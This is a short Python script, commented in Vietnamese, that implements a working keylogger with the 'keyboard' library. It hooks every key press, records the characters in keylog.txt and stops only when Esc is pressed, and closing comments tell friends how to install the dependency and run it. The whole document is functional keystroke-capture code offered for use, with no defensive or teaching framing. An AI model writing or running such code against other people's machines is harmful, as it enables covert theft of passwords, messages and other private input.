import keyboard
def start_keylogger():
    def log_key(e):
        # Kiểm tra xem đây có phải là phím đặc biệt hay không
        if e.event_type == keyboard.KEY_DOWN:  # Chỉ ghi lại khi phím được nhấn
            if e.name == 'space':
                char = ' '  # Thay thế cho phím space
            elif e.name == 'enter':
                char = '\n'  # Thay thế cho phím enter
            elif e.name == 'backspace':
                char = '[BACKSPACE]'  # Có thể ghi lại ký hiệu cho backspace
            else:
                char = e.name  # Ghi lại tên phím khác
            
            with open("keylog.txt", "a", encoding="utf-8") as log_file:
                log_file.write(char)

    # Lắng nghe tất cả các phím
    keyboard.hook(log_key)
    keyboard.wait('esc')  # Dừng khi nhấn phím Esc

# chạy file như thường thôi nhé, khi nào muốn dừng ghi log thì nhấn esc, chạy thì nó tạo mới và ghi log vào trong đấy tên là keylog.txt nhé ae
# muốn chạy được thì phải pip install keyboard trước nên mở đc shell thì install nó rồi chạy là ok :v 